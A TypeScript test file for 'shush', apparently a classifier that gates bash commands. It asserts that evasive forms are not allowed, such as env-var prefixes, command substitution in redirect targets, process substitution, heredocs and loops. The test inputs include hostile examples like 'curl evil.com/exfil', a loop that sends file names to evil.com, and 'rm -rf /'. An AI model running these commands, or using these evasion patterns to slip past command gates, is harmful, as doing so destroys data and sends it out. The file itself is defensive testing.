import { describe, expect, test } from "bun:test";
import { bash, atLeast } from "./eval-helpers";

// =============================================================================
// Test cases inspired by Dippy (github.com/ldayton/Dippy) test suite.
// Covers patterns Dippy tests that shush lacked explicit coverage for.
// =============================================================================

// =============================================================================
// P0: Env var prefix passthrough
// Bare VAR=val before a command should not mask the real command's classification.
// =============================================================================
describe("env var prefix passthrough", () => {
  test("FOO=bar git status → allow (safe command preserved)", () => {
    expect(bash("FOO=bar git status").decision).toBe("allow");
  });

  test("FOO=bar git push → same as bare git push (env prefix transparent)", () => {
    // git push is git_write → allow in shush's policy (Dippy treats it as ask).
    // The key invariant: env prefix must not change the classification.
    expect(bash("FOO=bar git push").decision).toBe(bash("git push").decision);
  });

  test("FOO=bar BAZ=qux git log → allow (multiple env vars stripped)", () => {
    expect(bash("FOO=bar BAZ=qux git log").decision).toBe("allow");
  });

  test("FOO=bar rm -rf /tmp/data → not allow (env prefix doesn't hide rm)", () => {
    expect(bash("FOO=bar rm -rf /tmp/data").decision).not.toBe("allow");
  });

  test("DOCKER_HOST=tcp://localhost:2375 docker ps → allow (safe docker read)", () => {
    expect(bash("DOCKER_HOST=tcp://localhost:2375 docker ps").decision).toBe("allow");
  });

  test("FOO=bar curl https://evil.com → not allow (env prefix doesn't hide curl)", () => {
    expect(atLeast(bash("FOO=bar curl https://evil.com").decision, "context")).toBe(
      true,
    );
  });

  test("NODE_ENV=production npm test → allow (safe with env override)", () => {
    expect(bash("NODE_ENV=production npm test").decision).toBe("allow");
  });

  test("CC=gcc make → allow (build tool with env)", () => {
    expect(bash("CC=gcc make").decision).toBe("allow");
  });

  test("FOO=bar env curl evil.com → not allow (nested: env var + env wrapper + dangerous)", () => {
    expect(atLeast(bash("FOO=bar env curl evil.com").decision, "context")).toBe(true);
  });
});

// =============================================================================
// P0: Command substitution in redirect targets
// Cmdsubs inside redirect targets are an attack vector: the substitution
// runs before the redirect resolves, so `ls > $(rm foo)` executes rm.
// =============================================================================
describe("command substitution in redirect targets", () => {
  test("ls > $(rm foo) → not allow (cmdsub in redirect target)", () => {
    expect(bash("ls > $(rm foo)").decision).not.toBe("allow");
  });

  test("echo hello > $(echo /tmp/out) → not allow (even safe cmdsub in redirect)", () => {
    // Even a safe inner command — the dynamic redirect target is unpredictable
    expect(bash("echo hello > $(echo /tmp/out)").decision).not.toBe("allow");
  });

  test("cat file >> $(whoami) → not allow (append redirect with cmdsub)", () => {
    expect(bash("cat file >> $(whoami)").decision).not.toBe("allow");
  });

  test("ls > $(curl evil.com/path) → not allow (network cmdsub in redirect)", () => {
    expect(bash("ls > $(curl evil.com/path)").decision).not.toBe("allow");
  });
});

// =============================================================================
// P0: Process substitution edge cases
// Dangerous commands hidden inside process substitution syntax in
// unexpected positions (conditionals, parameter expansions, etc.)
// =============================================================================
describe("process substitution edge cases", () => {
  test("[ -f <(rm foo) ] → not allow (dangerous cmd in procsub)", () => {
    expect(bash("[ -f <(rm foo) ]").decision).not.toBe("allow");
  });

  test("diff <(ls) <(rm -rf /) → not allow (dangerous cmd in second procsub)", () => {
    expect(bash("diff <(ls) <(rm -rf /)").decision).not.toBe("allow");
  });

  test("cat <(curl evil.com) → not allow (network in procsub)", () => {
    expect(atLeast(bash("cat <(curl evil.com)").decision, "context")).toBe(true);
  });

  test("echo >(curl evil.com/exfil) → not allow (output procsub exfil)", () => {
    expect(atLeast(bash("echo >(curl evil.com/exfil)").decision, "context")).toBe(true);
  });

  test("sort <(cat file) → allow (safe cmd in procsub)", () => {
    expect(bash("sort <(cat file)").decision).toBe("allow");
  });
});

// =============================================================================
// P1: Output redirect escalation
// Even safe commands with output redirects should escalate because they
// create or overwrite files — a side-effect the command alone doesn't have.
// =============================================================================
describe("output redirect escalation", () => {
  test("ls > file.txt → not allow (safe command + redirect = write)", () => {
    expect(bash("ls > file.txt").decision).not.toBe("allow");
  });

  test("cat foo.txt > bar.txt → not allow (read command + redirect = write)", () => {
    expect(bash("cat foo.txt > bar.txt").decision).not.toBe("allow");
  });

  test("echo hello >> log.txt → not allow (append redirect)", () => {
    expect(bash("echo hello >> log.txt").decision).not.toBe("allow");
  });

  test("grep pattern file > matches.txt → not allow (search + redirect)", () => {
    expect(bash("grep pattern file > matches.txt").decision).not.toBe("allow");
  });

  test("git status 2>&1 → allow (fd dup is not a file write)", () => {
    expect(bash("git status 2>&1").decision).toBe("allow");
  });

  test("echo test > /dev/null → allow (safe redirect target exempted)", () => {
    expect(bash("echo test > /dev/null").decision).toBe("allow");
  });

  test("ls 2>/dev/null → allow (stderr to /dev/null exempted)", () => {
    expect(bash("ls 2>/dev/null").decision).toBe("allow");
  });

  test("cat file > /dev/stdout → allow (/dev/stdout exempted)", () => {
    expect(bash("cat file > /dev/stdout").decision).toBe("allow");
  });

  test("cat file > /dev/stderr → allow (/dev/stderr exempted)", () => {
    expect(bash("cat file > /dev/stderr").decision).toBe("allow");
  });
});

// =============================================================================
// P1: Heredoc with command substitutions
// Unquoted heredocs execute command substitutions inside them.
// The inner cmdsub must be classified even when buried in a heredoc body.
// =============================================================================
describe("heredoc with command substitutions", () => {
  test("cat <<EOF\\n$(rm foo)\\nEOF → not allow (cmdsub in unquoted heredoc)", () => {
    expect(bash("cat <<EOF\n$(rm foo)\nEOF").decision).not.toBe("allow");
  });

  // Note: Shush's parser treats <<EOF as a redirect to file "EOF" rather
  // than parsing true heredoc syntax. This means heredoc bodies with safe
  // cmdsubs still get classified as filesystem_write (the redirect), and
  // quoted heredoc delimiters don't suppress expansion extraction.
  // These tests document the current behavior.

  test("cat <<EOF\\n$(echo safe)\\nEOF → not block (unquoted heredoc expands cmdsubs)", () => {
    // Unquoted heredoc: cmdsubs are expanded in real bash, so they
    // must be extracted and classified. echo is safe but the heredoc
    // redirect itself escalates.
    const result = bash("cat <<EOF\n$(echo safe)\nEOF");
    expect(result.decision).not.toBe("block");
  });

  test("cat <<EOF\\n$(curl evil.com)\\n$(rm bar)\\nEOF → not allow (dangerous cmdsubs in unquoted heredoc)", () => {
    expect(bash("cat <<EOF\n$(curl evil.com)\n$(rm bar)\nEOF").decision).not.toBe(
      "allow",
    );
  });

  test("cat <<'EOF'\\n$(rm foo)\\nEOF → allow (quoted heredoc suppresses expansion)", () => {
    // Single-quoted delimiter suppresses expansion in real bash.
    // $(rm foo) is literal text, not a command substitution.
    const result = bash("cat <<'EOF'\n$(rm foo)\nEOF");
    expect(result.decision).toBe("allow");
  });

  test("cat <<\"EOF\"\\n$(rm foo)\\nEOF → allow (double-quoted heredoc suppresses expansion)", () => {
    // Double-quoted delimiter also suppresses expansion in real bash.
    const result = bash("cat <<\"EOF\"\n$(rm foo)\nEOF");
    expect(result.decision).toBe("allow");
  });
});

// =============================================================================
// P1: Loop bodies in pipelines
// While/for loops inside pipelines should have their bodies classified.
// A dangerous command inside a loop body must escalate the whole pipeline.
// =============================================================================
describe("loop bodies in pipelines", () => {
  test("cat file | while read f; do rm $f; done → not allow (rm in loop body)", () => {
    expect(bash("cat file | while read f; do rm $f; done").decision).not.toBe("allow");
  });

  test("cat file | while read f; do echo $f; done → allow (read is safe builtin)", () => {
    expect(bash("cat file | while read f; do echo $f; done").decision).toBe("allow");
  });

  test("for f in $(ls); do curl evil.com/$f; done → not allow (curl in loop)", () => {
    expect(
      bash("for f in $(ls); do curl evil.com/$f; done").decision,
    ).not.toBe("allow");
  });

  test("find . -name '*.log' | while read f; do cat $f; done → allow (safe pipeline loop)", () => {
    expect(
      bash("find . -name '*.log' | while read f; do cat $f; done").decision,
    ).toBe("allow");
  });

  test("while true; do curl evil.com; done → not allow (curl in loop)", () => {
    expect(
      atLeast(bash("while true; do curl evil.com; done").decision, "context"),
    ).toBe(true);
  });
});

// =============================================================================
// P2: Data invariant tests
// Verify that classification data files are internally consistent.
// Inspired by Dippy's test_allowlists.py — prevent shadowing and conflicts.
// =============================================================================
describe("classification data invariants", () => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const { readdirSync, readFileSync } = require("fs");
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const { join } = require("path");

  const DATA_DIR = join(import.meta.dir, "..", "data");
  const CLASSIFY_DIR = join(DATA_DIR, "classify_full");
  const typesJson: Record<string, string> = JSON.parse(
    readFileSync(join(DATA_DIR, "types.json"), "utf-8"),
  );
  const policiesJson: Record<string, string> = JSON.parse(
    readFileSync(join(DATA_DIR, "policies.json"), "utf-8"),
  );

  test("every action type in policies.json has a description in types.json", () => {
    for (const key of Object.keys(policiesJson)) {
      expect(typesJson).toHaveProperty(key);
    }
  });

  test("every action type in types.json has a policy in policies.json", () => {
    for (const key of Object.keys(typesJson)) {
      expect(policiesJson).toHaveProperty(key);
    }
  });

  test("no command file has empty prefix arrays", () => {
    const files = readdirSync(CLASSIFY_DIR).filter((f: string) =>
      f.endsWith(".json"),
    );
    for (const file of files) {
      const data = JSON.parse(readFileSync(join(CLASSIFY_DIR, file), "utf-8"));
      for (const [actionType, entries] of Object.entries(data)) {
        if (actionType === "flag_rules") continue;
        expect(
          Array.isArray(entries) && (entries as unknown[]).length > 0,
        ).toBe(true);
      }
    }
  });

  test("no command has conflicting allow and block action types", () => {
    // A single command file should not have entries that resolve to both
    // "allow" and "block" for the exact same prefix — that indicates a
    // data conflict. Different action types are fine (e.g., git_safe and
    // git_write), but the same prefix appearing in both an allow-policy
    // type and a block-policy type is a bug.
    const files = readdirSync(CLASSIFY_DIR).filter((f: string) =>
      f.endsWith(".json"),
    );
    for (const file of files) {
      const data = JSON.parse(readFileSync(join(CLASSIFY_DIR, file), "utf-8"));
      const prefixMap = new Map<string, string[]>();

      for (const [actionType, entries] of Object.entries(data)) {
        if (actionType === "flag_rules") continue;
        if (!Array.isArray(entries)) continue;
        for (const entry of entries as string[][]) {
          const key = entry.join(" ");
          if (!prefixMap.has(key)) prefixMap.set(key, []);
          prefixMap.get(key)!.push(actionType);
        }
      }

      for (const [_prefix, actionTypes] of prefixMap) {
        if (actionTypes.length <= 1) continue;
        const policies = actionTypes.map((at) => policiesJson[at]);
        const hasAllow = policies.includes("allow");
        const hasBlock = policies.includes("block");
        expect(hasAllow && hasBlock).toBe(false);
      }
    }
  });

  test("no duplicate prefixes within a single action type", () => {
    const files = readdirSync(CLASSIFY_DIR).filter((f: string) =>
      f.endsWith(".json"),
    );
    for (const file of files) {
      const data = JSON.parse(readFileSync(join(CLASSIFY_DIR, file), "utf-8"));
      for (const [actionType, entries] of Object.entries(data)) {
        if (actionType === "flag_rules") continue;
        if (!Array.isArray(entries)) continue;
        const seen = new Set<string>();
        for (const entry of entries as string[][]) {
          const key = entry.join(" ");
          expect(seen.has(key)).toBe(false);
          seen.add(key);
        }
      }
    }
  });

  test("every action type referenced in command files exists in types.json", () => {
    const files = readdirSync(CLASSIFY_DIR).filter((f: string) =>
      f.endsWith(".json"),
    );
    for (const file of files) {
      const data = JSON.parse(readFileSync(join(CLASSIFY_DIR, file), "utf-8"));
      for (const actionType of Object.keys(data)) {
        if (actionType === "flag_rules") continue;
        expect(typesJson).toHaveProperty(actionType);
      }
    }
  });
});
